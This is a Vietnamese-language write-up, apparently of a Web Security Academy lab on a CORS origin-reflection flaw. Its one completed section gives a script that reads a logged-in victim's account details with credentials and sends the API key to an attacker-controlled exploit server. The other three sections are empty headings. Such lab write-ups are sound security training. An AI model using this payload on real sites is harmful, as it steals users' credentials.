# 1. CORS vulnerability with basic origin reflection
Ta thấy khi gửi request `GET /accountDetails`, trong response sẽ chứa thông tin đầy đủ về user trong phiên hiện tại. Như vậy ta vào exploit server và cấu hình đoạn code sau:

```
<script>
let xhr = new XMLHttpRequest();
xhr.onload = sendRequest;
xhr.open('GET', 'https://0a9f008704a74bedc06f45ff00f600cd.web-security-academy.net/accountDetails');
xhr.withCredentials = true;
xhr.send();

function sendRequest(){
fetch('https://exploit-0ab7003c04f14b63c07644d50138000b.exploit-server.net/exploit?apiKey='+this.responseText);
}
</script>
```
Đoạn script trên sẽ gửi request đến `/accountDetails`, lấy ra response rồi đặt làm tham số trong request gửi tới exploit server mà ta kiểm soát.

Sau khi click "Deliver to victim", vào Access log ta thấy có một request với tham số apiKey là một object:

![image](https://user-images.githubusercontent.com/103978452/210699785-c2fc9ed4-50fa-4d0c-82cd-3424d39d6f3b.png)

Thực hiện URL decode, rồi lấy giá trị của trường "apikey" để submit, kết quả thành công.

# 2. CORS vulnerability with trusted null origin

# 3. CORS vulnerability with trusted insecure protocols

# 4. CORS vulnerability with internal network pivot attackCORS vulnerability with internal network pivot attack
